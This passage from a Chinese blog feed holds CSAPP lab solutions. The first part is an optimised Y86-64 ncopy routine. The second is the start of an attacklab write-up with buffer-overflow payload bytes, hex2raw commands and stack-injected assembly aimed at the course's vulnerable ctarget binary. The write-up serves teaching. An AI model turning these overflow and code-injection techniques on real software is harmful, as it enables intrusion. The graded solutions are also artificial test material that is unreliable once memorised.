R10N8</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N8:</span><br><span class="line">andq %r9, %r9</span><br><span class="line">jle R10N9</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N9:</span><br><span class="line">andq %r10, %r10</span><br><span class="line">jle R10N10</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N10:</span><br><span class="line">andq %r11, %r11</span><br><span class="line">jle R10N11</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N11:</span><br><span class="line">andq %r12, %r12</span><br><span class="line">jle R10N12</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N12:</span><br><span class="line">andq %r13, %r13</span><br><span class="line">jle R10N13</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N13:</span><br><span class="line">andq %r14, %r14</span><br><span class="line">jle R10N14</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N14:</span><br><span class="line">andq %rcx, %rcx</span><br><span class="line">jle R10N15</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N15:</span><br><span class="line">andq %rbx, %rbx</span><br><span class="line">jle R10N16</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N16:</span><br><span class="line">andq %rbp, %rbp</span><br><span class="line">jle R10N17</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N17:</span><br><span class="line">iaddq $80, %rdi</span><br><span class="line">iaddq $80, %rsi</span><br><span class="line">iaddq $-10, %rdx</span><br><span class="line">jge Loop</span><br><span class="line"></span><br><span class="line">Rem:</span><br><span class="line">iaddq $10, %rdx</span><br><span class="line">jle Done</span><br><span class="line">iaddq $-4, %rdx</span><br><span class="line"></span><br><span class="line">jge GE4</span><br><span class="line">iaddq $2, %rdx</span><br><span class="line">jl R1</span><br><span class="line">je R2</span><br><span class="line">jmp R3</span><br><span class="line"></span><br><span class="line">GE4:</span><br><span class="line">je R4</span><br><span class="line">iaddq $-2, %rdx</span><br><span class="line">jl R5</span><br><span class="line">je R6</span><br><span class="line"></span><br><span class="line">iaddq $-2, %rdx</span><br><span class="line">jl R7</span><br><span class="line">je R8</span><br><span class="line"></span><br><span class="line">R9:</span><br><span class="line">mrmovq 64(%rdi), %r8</span><br><span class="line">rmmovq %r8, 64(%rsi)</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle R8</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R8:</span><br><span class="line">mrmovq 56(%rdi), %r8</span><br><span class="line">rmmovq %r8, 56(%rsi)</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle R7</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R7:</span><br><span class="line">mrmovq 48(%rdi), %r8</span><br><span class="line">rmmovq %r8, 48(%rsi)</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle R6</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R6:</span><br><span class="line">mrmovq 40(%rdi), %r8</span><br><span class="line">rmmovq %r8, 40(%rsi)</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle R5</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R5:</span><br><span class="line">mrmovq 32(%rdi), %r8</span><br><span class="line">rmmovq %r8, 32(%rsi)</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle R4</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R4:</span><br><span class="line">mrmovq 24(%rdi), %r8</span><br><span class="line">rmmovq %r8, 24(%rsi)</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle R3</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R3:</span><br><span class="line">mrmovq 16(%rdi), %r8</span><br><span class="line">rmmovq %r8, 16(%rsi)</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle R2</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R2:</span><br><span class="line">mrmovq 8(%rdi), %r8</span><br><span class="line">rmmovq %r8, 8(%rsi)</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle R1</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R1:</span><br><span class="line">mrmovq (%rdi), %r8</span><br><span class="line">rmmovq %r8, (%rsi)</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle Done</span><br><span class="line">iaddq $1, %rax</span><br></pre></td></tr></table></figure><p>该实现使用 <code>./benchmark.pl</code> 测试， CPE = 8.02。</p><p>继续观察上述代码，还有 2 处可以优化：</p><ol><li>每个 case 下，<code>mrmovq</code> 和 <code>rmmovq</code> 存在数据相关。</li><li>余数为 0 时，单独特判。假设每个余数等概率出现，那么很大概率这个条件跳转不会发生，从而增加了 CPE。所以，余数二分查找时要把 0 考虑进去。</li></ol><p>针对 1 的优化，从 <code>mrmovq</code> 和 <code>rmmovq</code> 不会设置<strong>条件码</strong>入手，将这两条指令插入到 <code>andq %r8, %r8</code> 和 <code>jle</code> 之间，从而避免流水线暂停（这两条指令相邻时暂停一周期）。解决方法是：将前一个数的正负判断延迟到当前模块处理。具体实现为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Rn:</span><br><span class="line">andq %r8, %r8# %r8=src[n - 1]</span><br><span class="line">mrmovq 8n(%rdi), %r8# 加载src[n]到%r8</span><br><span class="line">jle EnNP</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">EnNP:</span><br><span class="line">rmmovq %r8, 8n(%rsi)# 设置dst[n]=%r8</span><br></pre></td></tr></table></figure><p>该做法要求进入一个模块前，需要先加载一个数到寄存器 %r8 中。除了余数为 0 时，其他情形都需要 src[0]，所以考虑加载 src[0] 到 %r8 中。</p><p>针对 2 的优化，要注意二分查找的分界点，该过程可通过动态规划来计算最少的指令数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(int i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">" = "</span> &lt;&lt; x &lt;&lt; <span class="meta-string">", "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">" = "</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="comment">//-------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span>&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;, <span class="keyword">int</span>&gt; dp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; ij)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ij.first &gt;= ij.second) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (dp.count(ij)) <span class="keyword">return</span> dp[ij];</span><br><span class="line"><span class="keyword">int</span> l, r;</span><br><span class="line">tie(l, r) = ij;</span><br><span class="line">pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; ret(INT_MAX, INT_MAX);</span><br><span class="line">rep(m, l, r + <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">1</span> + <span class="number">1</span>;<span class="comment">// test; je</span></span><br><span class="line"><span class="keyword">if</span> (l &lt;= m - <span class="number">1</span>) <span class="comment">// jl, 左分支</span></span><br><span class="line">sum += (l &lt; m - <span class="number">1</span>) + (m - l) + dfs(mp(l, m - <span class="number">1</span>));</span><br><span class="line"><span class="keyword">if</span> (m + <span class="number">1</span> &lt;= r)<span class="comment">// jg, 右分支</span></span><br><span class="line">sum += (m + <span class="number">1</span> &lt; r) + (r - m) + dfs(mp(m + <span class="number">1</span>, r));</span><br><span class="line">ret = min(ret, mp(sum, m));</span><br><span class="line">&#125;</span><br><span class="line">dd(l), dd(r), dd(ret.first), de(ret.second);</span><br><span class="line"><span class="keyword">return</span> dp[ij] = ret.first;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> l, r; <span class="built_in">cin</span> &gt;&gt; l &gt;&gt; r;</span><br><span class="line">dd(l), de(r);</span><br><span class="line"><span class="keyword">int</span> ans = dfs(mp(l, r));</span><br><span class="line">de(ans);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在区间为 [0, 9] 时，关键输出为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">l = 7, r = 9, ret.first = 4, ret.second = 8</span><br><span class="line">l = 4, r = 5, ret.first = 3, ret.second = 4</span><br><span class="line">l = 4, r = 9, ret.first = 16, ret.second = 6</span><br><span class="line">l = 0, r = 2, ret.first = 4, ret.second = 1</span><br><span class="line">l = 0, r = 9, ret.first = 33, ret.second = 3</span><br></pre></td></tr></table></figure><p>查找的关键点为：1，3，4，6，8。</p><p>在实现过程反复测试中，发现处理器更倾向于总是跳转，结合具体的查找实现，最终的关键点定位：1，3，5，7， 8。</p><img src="/2020/02/21/CSAPP-archlab/binarysearch.png" title="二分查找"><p>优化后的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line">ncopy:</span><br><span class="line">iaddq $-10, %rdx</span><br><span class="line">jl Rem</span><br><span class="line"></span><br><span class="line">Loop:</span><br><span class="line">mrmovq (%rdi), %r8</span><br><span class="line">mrmovq 8(%rdi), %r9</span><br><span class="line">mrmovq 16(%rdi), %r10</span><br><span class="line">mrmovq 24(%rdi), %r11</span><br><span class="line">mrmovq 32(%rdi), %r12</span><br><span class="line">mrmovq 40(%rdi), %r13</span><br><span class="line">mrmovq 48(%rdi), %r14</span><br><span class="line">mrmovq 56(%rdi), %rcx</span><br><span class="line">mrmovq 64(%rdi), %rbx</span><br><span class="line">mrmovq 72(%rdi), %rbp</span><br><span class="line">rmmovq %r8, (%rsi)</span><br><span class="line">rmmovq %r9, 8(%rsi)</span><br><span class="line">rmmovq %r10, 16(%rsi)</span><br><span class="line">rmmovq %r11, 24(%rsi)</span><br><span class="line">rmmovq %r12, 32(%rsi)</span><br><span class="line">rmmovq %r13, 40(%rsi)</span><br><span class="line">rmmovq %r14, 48(%rsi)</span><br><span class="line">rmmovq %rcx, 56(%rsi)</span><br><span class="line">rmmovq %rbx, 64(%rsi)</span><br><span class="line">rmmovq %rbp, 72(%rsi)</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle R10N8</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N8:</span><br><span class="line">andq %r9, %r9</span><br><span class="line">jle R10N9</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N9:</span><br><span class="line">andq %r10, %r10</span><br><span class="line">jle R10N10</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N10:</span><br><span class="line">andq %r11, %r11</span><br><span class="line">jle R10N11</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N11:</span><br><span class="line">andq %r12, %r12</span><br><span class="line">jle R10N12</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N12:</span><br><span class="line">andq %r13, %r13</span><br><span class="line">jle R10N13</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N13:</span><br><span class="line">andq %r14, %r14</span><br><span class="line">jle R10N14</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N14:</span><br><span class="line">andq %rcx, %rcx</span><br><span class="line">jle R10N15</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N15:</span><br><span class="line">andq %rbx, %rbx</span><br><span class="line">jle R10N16</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N16:</span><br><span class="line">andq %rbp, %rbp</span><br><span class="line">jle R10N17</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R10N17:</span><br><span class="line">iaddq $80, %rdi</span><br><span class="line">iaddq $80, %rsi</span><br><span class="line">iaddq $-10, %rdx</span><br><span class="line">jge Loop</span><br><span class="line"></span><br><span class="line">Rem:</span><br><span class="line">mrmovq (%rdi), %r8</span><br><span class="line">iaddq $7, %rdx</span><br><span class="line">jge RGE3</span><br><span class="line">R02:</span><br><span class="line">iaddq $2, %rdx</span><br><span class="line">jl Done</span><br><span class="line">rmmovq %r8, (%rsi)</span><br><span class="line">je R1</span><br><span class="line">jmp R2</span><br><span class="line"></span><br><span class="line">R46:</span><br><span class="line">iaddq $2, %rdx</span><br><span class="line">jl R4</span><br><span class="line">je R5</span><br><span class="line">jmp R6</span><br><span class="line"></span><br><span class="line">RGE3:</span><br><span class="line">rmmovq %r8, (%rsi)</span><br><span class="line">je R3</span><br><span class="line"></span><br><span class="line">R49:</span><br><span class="line">iaddq $-4, %rdx</span><br><span class="line">jl R46</span><br><span class="line">je R7</span><br><span class="line"></span><br><span class="line">R89:</span><br><span class="line">iaddq $-1, %rdx</span><br><span class="line">je R8</span><br><span class="line"></span><br><span class="line">R9:</span><br><span class="line">andq %r8, %r8</span><br><span class="line">mrmovq 64(%rdi), %r8</span><br><span class="line">jle R9NP</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R9NP:</span><br><span class="line">rmmovq %r8, 64(%rsi)</span><br><span class="line">R8:</span><br><span class="line">andq %r8, %r8</span><br><span class="line">mrmovq 56(%rdi), %r8</span><br><span class="line">jle R8NP</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R8NP:</span><br><span class="line">rmmovq %r8, 56(%rsi)</span><br><span class="line">R7:</span><br><span class="line">andq %r8, %r8</span><br><span class="line">mrmovq 48(%rdi), %r8</span><br><span class="line">jle R7NP</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R7NP:</span><br><span class="line">rmmovq %r8, 48(%rsi)</span><br><span class="line">R6:</span><br><span class="line">andq %r8, %r8</span><br><span class="line">mrmovq 40(%rdi), %r8</span><br><span class="line">jle R6NP</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R6NP:</span><br><span class="line">rmmovq %r8, 40(%rsi)</span><br><span class="line">R5:</span><br><span class="line">andq %r8, %r8</span><br><span class="line">mrmovq 32(%rdi), %r8</span><br><span class="line">jle R5NP</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R5NP:</span><br><span class="line">rmmovq %r8, 32(%rsi)</span><br><span class="line">R4:</span><br><span class="line">andq %r8, %r8</span><br><span class="line">mrmovq 24(%rdi), %r8</span><br><span class="line">jle R4NP</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R4NP:</span><br><span class="line">rmmovq %r8, 24(%rsi)</span><br><span class="line">R3:</span><br><span class="line">andq %r8, %r8</span><br><span class="line">mrmovq 16(%rdi), %r8</span><br><span class="line">jle R3NP</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R3NP:</span><br><span class="line">rmmovq %r8, 16(%rsi)</span><br><span class="line">R2:</span><br><span class="line">andq %r8, %r8</span><br><span class="line">mrmovq 8(%rdi), %r8</span><br><span class="line">jle R2NP</span><br><span class="line">iaddq $1, %rax</span><br><span class="line">R2NP:</span><br><span class="line">rmmovq %r8, 8(%rsi)</span><br><span class="line">R1:</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle Done</span><br><span class="line">iaddq $1, %rax</span><br></pre></td></tr></table></figure><p>注意，该版本去掉了 <code>xorq %rax, %rax</code>。</p><p>测试结果：</p><img src="/2020/02/21/CSAPP-archlab/result.png" title="正确性结果"><img src="/2020/02/21/CSAPP-archlab/CPE.png" title="CPE"><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/33751460" target="_blank" rel="noopener">csapp archlab Part C</a></li><li><a href="https://zhuanlan.zhihu.com/p/77072339" target="_blank" rel="noopener">csapp archlab 60分解答</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;学习流水线化的 Y86-64 处理器的设计和实现，深刻理解&lt;strong&gt;流水线冒险&lt;/strong&gt;。&lt;/li&gt;
&lt;l
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CSAPP - attacklab</title>
    <link href="http://mcginn7.github.io/2020/02/19/CSAPP-attacklab/"/>
    <id>http://mcginn7.github.io/2020/02/19/CSAPP-attacklab/</id>
    <published>2020-02-19T09:39:55.000Z</published>
    <updated>2020-02-19T12:52:03.085Z</updated>
    
    <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li><p>在这个实验中，学习利用<strong>缓存溢出（buffer overflow）</strong>来改变程序的行为，即完成攻击者的目的效果。</p></li><li><p>需要掌握 x86-64 的栈和参数传递机制，其结构如下图所示。</p><img src="/2020/02/19/CSAPP-attacklab/stack.png" title="[图 1. 通用栈帧结构]"><p>其中函数 P 调用了函数 Q，<strong>返回地址</strong>为函数 P 调用位置的下一条指令。实验攻击均修改该返回地址来完成攻击目的。</p></li></ul><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实验中的程序 CTARGET 和 RTARGET 都调用了函数 test：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 test 又调用了函数 getbuf：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 Gets 从标准输入读取输入。</p><p>函数 Gets 没有进行边界检查，因此是不安全。</p><p>数组 buf 是局部变量，存储于栈上，因而通过输入可以修改栈上数据达到攻击目的。</p><p>BUFFER_SIZE 是个常量，使用 <code>gdb ctarget</code> 和 <code>disas getbuf</code> 可查看其大小（在本实验中，BUFFER_SIZE = 0x28）。</p><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><p>针对程序 CTARGET， 修改函数 test 调用 getbuf 的返回地址，使其返回 touch1 函数而非 test。</p><h4 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h4><p>使用 <code>disas touch1</code> 查看函数 touch1 的地址为 <strong>0x4017c0</strong>。</p><p>使用 <code>disas getbuf</code> 查看汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x4017a8 &lt;+0&gt;:     sub    $0x28,%rsp</span><br><span class="line">0x4017ac &lt;+4&gt;:     mov    %rsp,%rdi</span><br><span class="line">0x4017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">0x4017b4 &lt;+12&gt;:    mov    $0x1,%eax</span><br><span class="line">0x4017b9 &lt;+17&gt;:    add    $0x28,%rsp</span><br><span class="line">0x4017bd &lt;+21&gt;:    retq</span><br></pre></td></tr></table></figure><p>当读入字符串超过 40 时，依据栈帧结构，第 41~48 个字节即为返回地址，因此将其设置为 touch1 的地址即可。</p><p>实验工具包提供了 hex2raw 将字节码（十六进制）转换成字符串，输入字节为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>使用 hex2raw 转换字节码序列：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; bytes &gt; args.txt</span><br><span class="line">./ctarget -q -i args.txt</span><br></pre></td></tr></table></figure><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><h4 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h4><p>针对程序 CTARGET， 修改函数 test 调用 getbuf 的返回地址，使其返回 touch2 函数而非 test。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;<span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="做法-1"><a href="#做法-1" class="headerlink" title="做法"></a>做法</h4><p>使用 <code>disas touch2</code> 查看函数 touch2 的地址为 <strong>0x4017ec</strong>。</p><p>函数 touch2 需要传递参数 val，该参数的值等于实验工具包中 cookie.txt 保存值（在本实验中 <strong>cookie=0x59b997fa</strong>）。</p><p>函数的参数传递先使用 6 个寄存器，更多的参数保存在栈中。前 6 个寄存器如下图所示：</p><img src="/2020/02/19/CSAPP-attacklab/register.png" title="[图 2. 传递函数参数的寄存器]"><p>第一个参数寄存器为 %rdi，因此需要注入执行代码将 cookie 值保存到寄存器 %rdi 中。</p><p>首先<strong>执行代码本质</strong>上是字节序列，其次返回地址指向下一条指令的地址，最后 CTARGET 的堆栈位置每次运行都保持一致。利用这三条性质可将返回地址指向栈的某个位置，并在该位置填入合法的指令字节序列，注入攻击代码。</p><p><strong>A. 查看数组 buf 在栈上的保存位置。</strong></p><p>使用 <code>b getbuf</code> 在函数 getbuf 的第一条指令设置断点，然后使用 <code>n 2</code> 执行一下两条指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x4017a8 &lt;+0&gt;:     sub    $0x28,%rsp</span><br><span class="line">0x4017ac &lt;+4&gt;:     mov    %rsp,%rdi</span><br></pre></td></tr></table></figure><p>此时 %rdi = %rsp，为函数 Gets 的参数 buf，因此输入字符串的起始地址等于 %rsp。</p><p>使用 <code>print /x $rsp</code> 查看 %rsp 的值为 0x5561dc78，即 CTARGET 每次运行时 buf 的地址都是 0x5561dc78。</p><p><strong>B. 生成注入代码的字节序列。</strong></p><p>与 Level 1 类似，用 0x5561dc78 覆盖 getbuf 的返回地址，然后从 0x5561dc78 开始填充注入代码：保存 cookie 值到 %rdi，然后跳转执行 touch2，其汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line">push $0x4017ec# 填充 touch2 作为新返回地址</span><br><span 